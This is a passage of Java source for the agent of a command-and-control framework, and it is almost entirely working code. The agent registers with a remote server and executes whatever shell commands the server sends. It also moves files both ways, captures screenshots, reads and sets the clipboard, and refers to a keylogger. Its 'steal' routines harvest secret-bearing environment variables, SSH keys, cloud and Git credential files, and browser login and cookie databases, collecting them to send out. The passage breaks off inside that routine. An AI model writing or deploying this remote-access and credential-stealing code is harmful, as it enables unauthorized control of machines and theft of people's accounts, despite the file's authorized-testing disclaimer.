import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Java agent — C2 agent, Java port.
 *
 * Port of clients/agent.py with identical CLI flags, task types and result
 * shapes. Wire protocol documented in C2/protocol.md. Mirrors the canonical
 * Python client using only the JDK standard library (no third-party
 * JSON/HTTP deps).
 *
 * Build:  javac -encoding UTF-8 agent.java
 * Usage:
 *     java Agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
 *     java Agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
 *                  --interval 5 --jitter 2 --verbose
 *
 * Environment variables (accepted when the flag is not given):
 *     WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 *
 * Flags:
 *     --server URL      server base URL (required unless WYM_SERVER is set)
 *     --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 *     --interval N      heartbeat interval in seconds (default 10, min 1)
 *     --jitter N        random jitter in seconds added to the interval
 *     --state FILE      state file persisting the agent id (default ~/.wymagent_java.json)
 *     --verbose         print activity to stdout
 *     -h, --help        show this help and exit
 *
 * Only use against systems you own or are authorized to test.
 */
class Agent {

    static String server;
    static String token;
    static long intervalMs = 10_000;
    static long jitterMs = 0;
    static String stateFile;
    static boolean verbose;
    static String agentID = null;

    static final int SHELL_TIMEOUT = 120;
    static final int OUTPUT_LIMIT = 12_000;
    static final int HTTP_TIMEOUT_MS = 15_000;
    static final long STEAL_MAX_FILE = 8L * 1024 * 1024;

    static final String[] STEAL_KEYWORDS = {
        "token", "secret", "password", "passwd", "key=", "api", "auth",
        "aws", "azure", "google", "github", "gitlab", "slack", "discord",
        "cookie", "session", "credential", "access", "proxy", "login",
    };

    static final String[] STEAL_TOKEN_FILES = {
        ".aws/credentials", ".aws/config",
        ".git-credentials", ".netrc", ".npmrc", ".pypirc",
        ".pip/pip.conf", ".config/pip/pip.conf",
        ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
        ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
        ".docker/config.json", ".kube/config",
        ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
        ".ssh/known_hosts", ".ssh/authorized_keys",
    };

    static final String[] CHROMIUM_PROFILE_FILES = {"Login Data", "Cookies", "Web Data"};
    static final String[] FIREFOX_PROFILE_FILES = {"cookies.sqlite", "logins.json", "key4.db", "cert9.db"};

    static final KeyLogger keylog = new KeyLogger();
    static final Map<String, CloneWatcher> clones = new LinkedHashMap<String, CloneWatcher>();

    // ----------------------------------------------------------------- helpers

    static boolean isWindows() {
        return osName().toLowerCase(Locale.ROOT).contains("win");
    }

    static boolean isMac() {
        return osName().toLowerCase(Locale.ROOT).contains("mac");
    }

    static String osName() {
        return System.getProperty("os.name", "linux");
    }

    static String osKind() {
        if (isWindows()) return "windows";
        if (isMac()) return "darwin";
        return "linux";
    }

    static void log(String msg) {
        if (verbose) System.out.println("[*] " + msg);
    }

    static String homeDir() {
        return System.getProperty("user.home", ".");
    }

    static String homeFile(String name) {
        return Paths.get(homeDir(), name).toString();
    }

    static String localIP() {
        // Prefer connecting to the real outbound endpoint to learn the
        // interface used; fall back to the loopback-safe local host address,
        // then to the first non-loopback network interface.
        try {
            Socket s = new Socket();
            try {
                s.bind(new InetSocketAddress("0.0.0.0", 0));
                s.connect(new InetSocketAddress(InetAddress.getByName("8.8.8.8"), 80), 2000);
                String ip = s.getLocalAddress().getHostAddress();
                if (ip != null && !ip.isEmpty()) return ip;
            } catch (Exception ignored) {
            } finally {
                try { s.close(); } catch (IOException ignored) {}
            }
        } catch (Exception ignored) {
        }
        try {
            InetAddress local = InetAddress.getLocalHost();
            String ip = local.getHostAddress();
            if (ip != null && !ip.isEmpty() && !ip.startsWith("127.")) return ip;
        } catch (Exception ignored) {
        }
        try {
            for (java.util.Enumeration<java.net.NetworkInterface> en =
                     java.net.NetworkInterface.getNetworkInterfaces();
                 en != null && en.hasMoreElements();) {
                java.net.NetworkInterface ni = en.nextElement();
                if (ni.isLoopback() || !ni.isUp()) continue;
                for (java.util.Enumeration<InetAddress> ea = ni.getInetAddresses();
                     ea.hasMoreElements();) {
                    InetAddress a = ea.nextElement();
                    if (a instanceof java.net.Inet4Address && !a.isLoopbackAddress()) {
                        return a.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    static String nowStr() {
        SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        f.setTimeZone(TimeZone.getTimeZone("UTC"));
        return f.format(new Date());
    }

    static String truncateOutput(String text, int limit) {
        if (text == null || text.length() <= limit) return text;
        int head = limit / 5;
        int tail = limit - head - 20;
        return text.substring(0, head) + "\n... ["
            + (text.length() - head - tail) + " chars truncated] ...\n"
            + text.substring(text.length() - tail);
    }

    /**
     * Minimal JSON serialization (builds objects, arrays, strings).
     */
    static void jsonString(Appendable sb, String s) throws IOException {
        sb.append('"');
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                case '\b': sb.append("\\b"); break;
                case '\f': sb.append("\\f"); break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        sb.append('"');
    }

    static String jsonEncode(Map<String, Object> obj) {
        StringBuilder sb = new StringBuilder();
        try {
            writeJsonValue(sb, obj);
        } catch (IOException ignored) {}
        return sb.toString();
    }

    @SuppressWarnings("unchecked")
    static void writeJsonValue(Appendable sb, Object v) throws IOException {
        if (v == null) {
            sb.append("null");
        } else if (v instanceof String) {
            jsonString(sb, (String) v);
        } else if (v instanceof Boolean) {
            sb.append(((Boolean) v).booleanValue() ? "true" : "false");
        } else if (v instanceof Number) {
            sb.append(v.toString());
        } else if (v instanceof Map) {
            sb.append('{');
            boolean first = true;
            for (Map.Entry<String, Object> e : ((Map<String, Object>) v).entrySet()) {
                if (!first) sb.append(',');
                first = false;
                jsonString(sb, e.getKey());
                sb.append(':');
                writeJsonValue(sb, e.getValue());
            }
            sb.append('}');
        } else if (v instanceof List) {
            sb.append('[');
            boolean first = true;
            for (Object o : (List<Object>) v) {
                if (!first) sb.append(',');
                first = false;
                writeJsonValue(sb, o);
            }
            sb.append(']');
        } else {
            jsonString(sb, String.valueOf(v));
        }
    }

    /**
     * Minimal JSON parser -> Map/List/String/Double/Boolean/null.
     */
    static class JsonParser {
        private final String s;
        private int pos;

        JsonParser(String s) {
            this.s = s;
        }

        Object parse() {
            Object v = value();
            if (v == null && pos < s.length()) throw new RuntimeException("json parse error");
            return v;
        }

        private void ws() {
            while (pos < s.length()) {
                char c = s.charAt(pos);
                if (c == ' ' || c == '\t' || c == '\n' || c == '\r') pos++;
                else break;
            }
        }

        private Object value() {
            ws();
            if (pos >= s.length()) return null;
            char c = s.charAt(pos);
            if (c == '{') return object();
            if (c == '[') return array();
            if (c == '"') return string();
            if (c == 't') { expect("true"); return Boolean.TRUE; }
            if (c == 'f') { expect("false"); return Boolean.FALSE; }
            if (c == 'n') { expect("null"); return null; }
            return number();
        }

        private void expect(String lit) {
            for (int i = 0; i < lit.length(); i++) {
                if (pos + i >= s.length() || s.charAt(pos + i) != lit.charAt(i)) {
                    throw new RuntimeException("json parse error: expected " + lit);
                }
            }
            pos += lit.length();
        }

        private Map<String, Object> object() {
            Map<String, Object> m = new LinkedHashMap<String, Object>();
            pos++; // {
            ws();
            if (pos < s.length() && s.charAt(pos) == '}') { pos++; return m; }
            while (pos < s.length()) {
                ws();
                String k = string();
                ws();
                if (pos >= s.length() || s.charAt(pos) != ':') break;
                pos++;
                m.put(k, value());
                ws();
                if (pos >= s.length()) break;
                char c = s.charAt(pos);
                if (c == ',') { pos++; continue; }
                if (c == '}') { pos++; break; }
                break;
            }
            return m;
        }

        private List<Object> array() {
            List<Object> l = new ArrayList<Object>();
            pos++; // [
            ws();
            if (pos < s.length() && s.charAt(pos) == ']') { pos++; return l; }
            while (pos < s.length()) {
                l.add(value());
                ws();
                if (pos >= s.length()) break;
                char c = s.charAt(pos);
                if (c == ',') { pos++; continue; }
                if (c == ']') { pos++; break; }
                break;
            }
            return l;
        }

        private String string() {
            StringBuilder sb = new StringBuilder();
            if (pos >= s.length() || s.charAt(pos) != '"') throw new RuntimeException("json parse error");
            pos++;
            while (pos < s.length()) {
                char c = s.charAt(pos);
                if (c == '"') { pos++; break; }
                if (c == '\\') {
                    pos++;
                    if (pos >= s.length()) break;
                    char e = s.charAt(pos);
                    switch (e) {
                        case '"': sb.append('"'); break;
                        case '\\': sb.append('\\'); break;
                        case '/': sb.append('/'); break;
                        case 'b': sb.append('\b'); break;
                        case 'f': sb.append('\f'); break;
                        case 'n': sb.append('\n'); break;
                        case 'r': sb.append('\r'); break;
                        case 't': sb.append('\t'); break;
                        case 'u':
                            if (pos + 4 < s.length()) {
                                try {
                                    sb.append((char) Integer.parseInt(s.substring(pos + 1, pos + 5), 16));
                                    pos += 4;
                                } catch (NumberFormatException ignored) {}
                            }
                            break;
                        default: sb.append(e);
                    }
                    pos++;
                } else {
                    sb.append(c);
                    pos++;
                }
            }
            return sb.toString();
        }

        private Object number() {
            int start = pos;
            while (pos < s.length()) {
                char c = s.charAt(pos);
                if (Character.isDigit(c) || c == '-' || c == '+' || c == '.' || c == 'e' || c == 'E') pos++;
                else break;
            }
            String num = s.substring(start, pos);
            try {
                if (num.indexOf('.') >= 0 || num.indexOf('e') >= 0 || num.indexOf('E') >= 0) {
                    return Double.valueOf(num);
                }
                return Long.valueOf(num);
            } catch (NumberFormatException e) {
                return num;
            }
        }
    }

    static Map<String, Object> jsonObj(Object o) {
        if (o instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> m = (Map<String, Object>) o;
            return m;
        }
        return new LinkedHashMap<String, Object>();
    }

    @SuppressWarnings("unchecked")
    static List<Object> jsonList(Object o) {
        if (o instanceof List) return (List<Object>) o;
        return new ArrayList<Object>();
    }

    @SuppressWarnings("unchecked")
    static String jsonGetStr(Object o, String key) {
        if (o instanceof Map) {
            Object v = ((Map<String, Object>) o).get(key);
            return v == null ? "" : String.valueOf(v);
        }
        return "";
    }

    // -------------------------------------------------------------------- http

    static class Resp {
        int code;
        byte[] body;
        Resp(int code, byte[] body) {
            this.code = code;
            this.body = body;
        }
        String text() {
            return new String(body, StandardCharsets.UTF_8);
        }
    }

    static Resp http(String method, String path, Map<String, String> headers, byte[] body,
                     int connectMs, int readMs) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(server + path).openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(connectMs);
        c.setReadTimeout(readMs);
        c.setInstanceFollowRedirects(true);
        c.setRequestProperty("X-Agent-Token", token);
        if (headers != null) {
            for (Map.Entry<String, String> e : headers.entrySet()) {
                c.setRequestProperty(e.getKey(), e.getValue());
            }
        }
        if (body != null) {
            c.setDoOutput(true);
            c.setRequestProperty("Content-Length", String.valueOf(body.length));
            OutputStream os = c.getOutputStream();
            os.write(body);
            os.flush();
            os.close();
        }
        int code = c.getResponseCode();
        InputStream is = code >= 400 ? c.getErrorStream() : c.getInputStream();
        byte[] data = new byte[0];
        if (is != null) {
            try {
                data = readAll(is);
            } finally {
                is.close();
            }
        }
        c.disconnect();
        return new Resp(code, data);
    }

    static byte[] readAll(InputStream in) throws IOException {
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[65536];
        int n;
        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        return out.toByteArray();
    }

    static Resp postJson(String path, Map<String, Object> body, int readMs) throws IOException {
        Map<String, String> h = new HashMap<String, String>();
        h.put("Content-Type", "application/json");
        return http("POST", path, h, jsonEncode(body).getBytes(StandardCharsets.UTF_8),
                    HTTP_TIMEOUT_MS, readMs);
    }

    static byte[] multipartBody(String filename, String contentType, byte[] data, String boundary)
            throws IOException {
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        String head = "--" + boundary + "\r\n"
            + "Content-Disposition: form-data; name=\"file\"; filename=\""
            + filename + "\"\r\n"
            + "Content-Type: " + contentType + "\r\n\r\n";
        out.write(head.getBytes(StandardCharsets.US_ASCII));
        out.write(data);
        out.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.US_ASCII));
        return out.toByteArray();
    }

    static Resp uploadBytes(String taskId, String filename, String contentType, byte[] data)
            throws IOException {
        String boundary = "wymboundary" + System.nanoTime();
        byte[] body = multipartBody(filename, contentType, data, boundary);
        Map<String, String> h = new HashMap<String, String>();
        h.put("Content-Type", "multipart/form-data; boundary=" + boundary);
        return http("POST", "/api/files/" + taskId, h, body, HTTP_TIMEOUT_MS, 300_000);
    }

    // ------------------------------------------------------------------ state

    static void loadID() {
        File f = new File(stateFile);
        if (!f.exists()) return;
        try {
            String s = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
            Object o = new JsonParser(s).parse();
            if (o instanceof Map) {
                agentID = jsonGetStr(o, "agent_id");
            }
        } catch (Exception ignored) {}
    }

    static void saveID() {
        try {
            Map<String, Object> m = new LinkedHashMap<String, Object>();
            m.put("agent_id", agentID);
            Files.write(Paths.get(stateFile),
                        jsonEncode(m).getBytes(StandardCharsets.UTF_8));
        } catch (IOException ignored) {}
    }

    // ------------------------------------------------------------- lifecycle

    @SuppressWarnings("unchecked")
    static void register() throws IOException {
        Map<String, Object> body = new LinkedHashMap<String, Object>();
        body.put("agent_id", agentID);
        body.put("hostname", hostName());
        body.put("username", System.getProperty("user.name", ""));
        body.put("os", osKind());
        body.put("arch", System.getProperty("os.arch", ""));
        body.put("pid", pid());
        body.put("ip", localIP());
        body.put("version", "1.0");
        body.put("type", "Java");
        log("registering with " + server);
        Resp r = postJson("/api/register", body, HTTP_TIMEOUT_MS);
        if (r.code != 200) {
            throw new IOException("register failed: HTTP " + r.code + ": " + r.text().trim());
        }
        Map<String, Object> resp = jsonObj(new JsonParser(r.text()).parse());
        agentID = jsonGetStr(resp, "agent_id");
        saveID();
        log("agent id: " + agentID);
    }

    static String hostName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return System.getenv("COMPUTERNAME") != null
                ? System.getenv("COMPUTERNAME") : "unknown";
        }
    }

    static long pid() {
        String p = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
        int idx = p.indexOf('@');
        if (idx > 0) {
            try {
                return Long.parseLong(p.substring(0, idx));
            } catch (NumberFormatException ignored) {}
        }
        return 0;
    }

    /** Java 8-safe Process.pid() via reflection (returns 0 if unavailable). */
    static long processPid(Process p) {
        try {
            java.lang.reflect.Method m = Process.class.getMethod("pid");
            return ((Number) m.invoke(p)).longValue();
        } catch (Exception e) {
            return 0;
        }
    }

    static List<Map<String, Object>> checkin() throws IOException {
        Map<String, Object> body = new LinkedHashMap<String, Object>();
        body.put("agent_id", agentID);
        Resp r = postJson("/api/checkin", body, HTTP_TIMEOUT_MS);
        if (r.code == 404) {
            log("server does not know us - re-registering");
            register();
            return new ArrayList<Map<String, Object>>();
        }
        if (r.code != 200) {
            throw new IOException("checkin failed: HTTP " + r.code + ": " + r.text().trim());
        }
        Object o = new JsonParser(r.text()).parse();
        List<Map<String, Object>> tasks = new ArrayList<Map<String, Object>>();
        if (o instanceof Map) {
            for (Object t : jsonList(((Map<String, Object>) o).get("tasks"))) {
                if (t instanceof Map) tasks.add((Map<String, Object>) t);
            }
        }
        return tasks;
    }

    static void report(String taskId, Map<String, Object> result) {
        Map<String, Object> body = new LinkedHashMap<String, Object>();
        body.put("agent_id", agentID);
        body.put("task_id", taskId);
        body.put("output", jsonGetStr(result, "output"));
        Object ec = result.get("exit_code");
        body.put("exit_code", ec instanceof Number ? ((Number) ec).longValue() : 0L);
        body.put("error", jsonGetStr(result, "error"));
        try {
            Resp r = postJson("/api/result", body, HTTP_TIMEOUT_MS);
            if (r.code != 200) log("failed to report result: HTTP " + r.code);
        } catch (Exception e) {
            log("failed to report result: " + e.getMessage());
        }
    }

    // ------------------------------------------------------------- commands

    static String[] shellPrefix() {
        if (isWindows()) return new String[]{"cmd", "/C"};
        return new String[]{"sh", "-c"};
    }

    static Map<String, Object> result(String output, int code) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        m.put("output", output);
        m.put("exit_code", code);
        return m;
    }

    static Map<String, Object> taskShell(Map<String, Object> args) {
        String command = jsonGetStr(args, "command");
        long timeout = SHELL_TIMEOUT;
        try {
            timeout = Math.max(1, Math.min(Long.parseLong(jsonGetStr(args, "timeout")), 3600));
        } catch (NumberFormatException ignored) {}
        log("executing: " + command);
        ProcessResult pr = execCapture(command, timeout);
        String out = truncateOutput(pr.output, OUTPUT_LIMIT);
        return result(out, pr.exitCode);
    }

    static class ProcessResult {
        String output;
        int exitCode;
        ProcessResult(String output, int exitCode) {
            this.output = output;
            this.exitCode = exitCode;
        }
    }

    static ProcessResult execCapture(String command, long timeoutSec) {
        List<String> cmdLine = new ArrayList<String>();
        cmdLine.add(shellPrefix()[0]);
        cmdLine.add(shellPrefix()[1]);
        cmdLine.add(command);
        Process p = null;
        try {
            p = new ProcessBuilder(cmdLine).redirectErrorStream(true).start();
        } catch (IOException e) {
            return new ProcessResult("error: " + e.getMessage(), 1);
        }
        final StringBuilder out = new StringBuilder();
        final InputStream stream = p.getInputStream();
        Thread reader = new Thread(new Runnable() {
            public void run() {
                byte[] buf = new byte[4096];
                int n;
                try {
                    while ((n = stream.read(buf)) != -1) {
                        out.append(new String(buf, 0, n, StandardCharsets.UTF_8));
                    }
                } catch (IOException ignored) {}
            }
        });
        reader.setDaemon(true);
        reader.start();
        boolean done = false;
        try {
            done = p.waitFor(timeoutSec, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        if (!done) {
            if (isWindows()) {
                long pid = processPid(p);
                if (pid > 0) {
                    try {
                        new ProcessBuilder("taskkill", "/PID", String.valueOf(pid), "/T", "/F").start();
                    } catch (Exception ignored) {}
                }
            }
            p.destroyForcibly();
            return new ProcessResult("command timed out (" + timeoutSec + "s)", 124);
        }
        try {
            reader.join(2000);
        } catch (InterruptedException ignored) {}
        return new ProcessResult(out.toString(), p.exitValue());
    }

    static Map<String, Object> taskDownload(String taskId, Map<String, Object> args) {
        String name = jsonGetStr(args, "file");
        if (name.isEmpty()) name = "payload.bin";
        String dest = jsonGetStr(args, "destination");
        if (dest.isEmpty()) dest = name;
        try {
            Resp r = http("GET", "/api/files/" + taskId, null, null, HTTP_TIMEOUT_MS, 120_000);
            if (r.code != 200) return result("download failed: HTTP " + r.code, 1);
            File d = new File(dest);
            if (d.isDirectory() || dest.endsWith("/") || dest.endsWith("\\")) {
                d = new File(d, name);
            }
            File parent = d.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            Files.write(d.toPath(), r.body);
            return result("saved " + r.body.length + " bytes to " + d.getPath(), 0);
        } catch (Exception e) {
            return result("error: " + e.getMessage(), 1);
        }
    }

    static Map<String, Object> taskUpload(String taskId, Map<String, Object> args) {
        String path = jsonGetStr(args, "path");
        File f = new File(path);
        if (!f.isFile()) return result("file not found: " + path, 1);
        try {
            byte[] data = Files.readAllBytes(f.toPath());
            Resp r = uploadBytes(taskId, f.getName(), "application/octet-stream", data);
            if (r.code != 200) return result("upload failed: HTTP " + r.code, 1);
            return result("uploaded " + path, 0);
        } catch (Exception e) {
            return result("error: " + e.getMessage(), 1);
        }
    }

    static Map<String, Object> taskSleep(Map<String, Object> args) {
        long secs = 10;
        try {
            secs = Math.max(1, Long.parseLong(jsonGetStr(args, "seconds")));
        } catch (NumberFormatException ignored) {}
        intervalMs = secs * 1000;
        return result("heartbeat interval set to " + secs + "s", 0);
    }

    static Map<String, Object> taskKeylog(Map<String, Object> args) {
        String action = jsonGetStr(args, "action");
        if (action.isEmpty()) action = "dump";
        if (action.equals("start")) return result(keylog.start(), 0);
        if (action.equals("stop")) return result(keylog.stop(), 0);
        return result(keylog.dump(), 0);
    }

    static Map<String, Object> taskClipboard(Map<String, Object> args) {
        String action = jsonGetStr(args, "action");
        if (action.isEmpty()) action = "get";
        if (action.equals("set")) return clipboardSet(jsonGetStr(args, "text"));
        return clipboardGet();
    }

    static Map<String, Object> clipboardGet() {
        List<String[]> cmds = new ArrayList<String[]>();
        if (isWindows()) {
            cmds.add(new String[]{"powershell", "-NoProfile", "-command", "Get-Clipboard"});
        } else if (isMac()) {
            cmds.add(new String[]{"pbpaste"});
        } else {
            cmds.add(new String[]{"xclip", "-selection", "clipboard", "-o"});
        }
        for (String[] c : cmds) {
            ProcessResult pr = execRaw(c);
            if (pr.exitCode == 0) return result(pr.output.trim(), 0);
        }
        return result("error: no clipboard tool available", 1);
    }

    static Map<String, Object> clipboardSet(String text) {
        try {
            if (isWindows()) {
                String escaped = text.replace("'", "''");
                ProcessResult pr = execRaw(new String[]{
                    "powershell", "-NoProfile", "-command",
                    "Set-Clipboard -Value '" + escaped + "'"});
                if (pr.exitCode == 0) return result("clipboard set", 0);
                return result("error: " + pr.output, 1);
            }
            List<String[]> cmds = new ArrayList<String[]>();
            if (isMac()) {
                cmds.add(new String[]{"pbcopy"});
            } else {
                cmds.add(new String[]{"xclip", "-selection", "clipboard"});
            }
            for (String[] c : cmds) {
                Process p = new ProcessBuilder(c).start();
                OutputStream os = p.getOutputStream();
                os.write(text.getBytes(StandardCharsets.UTF_8));
                os.close();
                if (p.waitFor(5, TimeUnit.SECONDS) && p.exitValue() == 0) {
                    return result("clipboard set", 0);
                }
            }
            return result("error: no clipboard tool available", 1);
        } catch (Exception e) {
            return result("error: " + e.getMessage(), 1);
        }
    }

    static ProcessResult execRaw(String[] cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            byte[] data = readAll(p.getInputStream());
            p.waitFor(10, TimeUnit.SECONDS);
            return new ProcessResult(new String(data, StandardCharsets.UTF_8), p.exitValue());
        } catch (Exception e) {
            return new ProcessResult("error: " + e.getMessage(), 1);
        }
    }

    static Map<String, Object> taskScreenshot(String taskId, Map<String, Object> args) {
        File tmp = null;
        try {
            tmp = File.createTempFile("wymshot-", ".png");
            String shotPath = tmp.getAbsolutePath();
            tmp.delete();
            boolean ok = true;
            String captureErr = null;
            if (isWindows()) {
                String ps = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
                    + "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                    + "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);"
                    + "$g=[System.Drawing.Graphics]::FromImage($bmp);"
                    + "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);"
                    + "$bmp.Save('" + shotPath + "')";
                ProcessResult pr = execRaw(new String[]{"powershell", "-NoProfile", "-command", ps});
                if (pr.exitCode != 0) {
                    ok = false;
                    captureErr = pr.output;
                }
            } else if (isMac()) {
                ProcessResult pr = execRaw(new String[]{"screencapture", "-x", shotPath});
                if (pr.exitCode != 0) {
                    ok = false;
                    captureErr = pr.output;
                }
            } else {
                String[][] tools = {
                    {"import", "-window", "root", shotPath},
                    {"scrot", shotPath},
                    {"gnome-screenshot", "-f", shotPath},
                };
                ok = false;
                for (String[] tool : tools) {
                    ProcessResult pr = execRaw(tool);
                    if (pr.exitCode == 0) {
                        ok = true;
                        break;
                    }
                }
                if (!ok) captureErr = "no screenshot tool available";
            }
            File shot = new File(shotPath);
            if (!ok || !shot.isFile() || shot.length() == 0) {
                if (shot.exists()) shot.delete();
                return result("error: screenshot failed"
                    + (captureErr != null ? ": " + captureErr : ""), 1);
            }
            String nameStr = jsonGetStr(args, "name").trim();
            if (nameStr.isEmpty()) nameStr = "screenshot";
            byte[] data = Files.readAllBytes(shot.toPath());
            shot.delete();
            Resp r = uploadBytes(taskId, nameStr + ".png", "image/png", data);
            if (r.code != 200) return result("screenshot upload failed: HTTP " + r.code, 1);
            return result("screenshot saved (" + nameStr + ".png)", 0);
        } catch (Exception e) {
            if (tmp != null && tmp.exists()) tmp.delete();
            return result("error: " + e.getMessage(), 1);
        }
    }

    // ---------------------------------------------------------------- steal

    static boolean stealSafeCopy(String src, File dstDir) {
        try {
            File s = new File(src);
            if (!s.isFile() || s.length() > STEAL_MAX_FILE) return false;
            if (!dstDir.exists()) dstDir.mkdirs();
            Files.copy(s.toPath(), new File(dstDir, s.getName()).toPath());
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    static List<String> stealEnv(File work) {
        List<String> lines = new ArrayList<String>();
        for (Map.Entry<String, String> e : System.getenv().entrySet()) {
            String low = e.getKey().toLowerCase(Locale.ROOT);
            for (String w : STEAL_KEYWORDS) {
                if (low.contains(w)) {
                    lines.add(e.getKey() + "=" + e.getValue());
                    break;
                }
            }
        }
        if (lines.isEmpty()) return new ArrayList<String>();
        java.util.Collections.sort(lines);
        try {
            StringBuilder sb = new StringBuilder();
            for (String l : lines) sb.append(l).append("\n");
            Files.write(Paths.get(work.getPath(), "env.txt"),
                        sb.toString().getBytes(StandardCharsets.UTF_8));
        } catch (IOException ignored) {}
        List<String> hits = new ArrayList<String>();
        hits.add("env.txt");
        return hits;
    }

    static List<String> stealTokens(File work) {
        String home = homeDir();
        File dstDir = new File(work, "tokens");
        List<String> hits = new ArrayList<String>();
        for (String rel : STEAL_TOKEN_FILES) {
            String src = Paths.get(home, rel).toString();
            if (stealSafeCopy(src, dstDir)) {
                File s = new File(src);
                hits.add("tokens/" + s.getName());
            }
        }
        return hits;
    }

    static Map<String, String> browserRoots() {
        Map<String, String> roots = new LinkedHashMap<String, String>();
        String home = homeDir();
        if (isWindows()) {
            String la = System.getenv("LOCALAPPDATA");
            String appd = System.getenv("APPDATA");
            String[] chromiums = {
                "Google/Chrome/User Data", "Microsoft/Edge/User Data",
                "BraveSoftware/Brave-Browser/User Data", "Opera Software/Opera Stable",
            };
            if (la != null && !la.isEmpty()) {
                for (String rel : chromiums) roots.put(Paths.get(la, rel).toString(), "chromium");
            }
            if (appd != null && !appd.isEmpty()) {
                roots.put(Paths.get(appd, "Mozilla/Firefox/Profiles").toString(), "firefox");
            }
        } else if (isMac()) {
            String base = Paths.get(home, "Library/Application Support").toString();
            String[] names = {"Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"};
            for (String n : names) roots.put(Paths.get(base, n).toString(), "chromium");
            roots.put(Paths.get(base, "Firefox/Profiles").toString(), "firefox");
        } else {
            String[] rels = {"google-chrome", "chromium", "microsoft-edge", "msedge",
                             "brave-browser", "brave", "opera"};
            for (String rel : rels) {
                roots.put(Paths.get(home, ".config", rel).toString(), "chromium");
            }
            roots.put(Paths.get(home, ".mozilla/firefox").toString(), "firefox");
        }
        return roots;
    }

    static List<String> stealBrowser(File work) {
        List<String> hits = new ArrayList<String>();
        for (Map.Entry<String, String> be : browserRoots().entrySet()) {
            File root = new File(be.getKey());
            String kind = be.getValue();
            if (!root.isDirectory()) continue;
            String[] targets = kind.equals("firefox") ? FIREFOX_PROFILE_FILES
                                                      : CHROMIUM_PROFILE_FILES;
            List<File> stack = new ArrayList<File>();
            stack.add(root);
            while (!stack.isEmpty()) {
                File dir = stack.remove(stack.size() - 1);
                File[] subs = dir.listFiles();
                if (subs == null) continue;
                for (File f : subs) {
                    if (f.isDirectory()) {
                        stack.add(f);
                        continue;
                    }
                    for (String tn : targets) {
                        if (f.getName().equals(tn) && f.isFile()) {
                            String rel = relativeToBase(root, dir);
                            File dstDir = new File(Paths.get(
                                work.getPath(), "browser", kind,
                                rel.replace(File.separator, "__")).toString());
                            if (stealSafeCopy(f.getPath(), dstDir)) {
                                hits.add("browser/" + kind + "/"
                                    + rel.replace(File.separator, "__") + "/" + tn);
                            }
                            break;
                        }
                    }
                }
            }
        }
        return hits;
    }

    static String relativeToBase(File base, File dir) {
        try {
            return base.toPath().relativize(dir.toPath()).toString();
        } catch (Exception e) {
            return dir.getName();
        }
    }

    static Map<String, Object> taskSteal(String taskId, Map<String, Object> args) {
        String profile = jsonGetStr(args, "profile").trim().toLowerCase(Locale.ROOT);
        if (!profile.equals("all") && !profile.equals("env")
            && !profile.equals("tokens") && !profile.equals("browser")) {
            profile = "all";
        }
        File work = null;
        try {
            work = Files.createTempDirectory("wymsteal_").toFile();
            List<String> manifest = new ArrayList<String>();
            if (profile.equals("all") || profile.equals("env")) {
                log("steal: collecting env vars");
                manifest.addAll(stealEnv(work));
            }
            if (profile.equals("all") || profile.equals("tokens")) {
                log("steal: collecting token files");
                manifest.addAll(stealTokens(work));
            }
            if (profile.equals("all") || profile.equals("browser")) {
                log("steal: collecting browser dbs");
                manifest.addAll(stealBrowser(work));
            }
            java.util.Collections.sort(manifest);
            if (manifest.isEmpty()) {
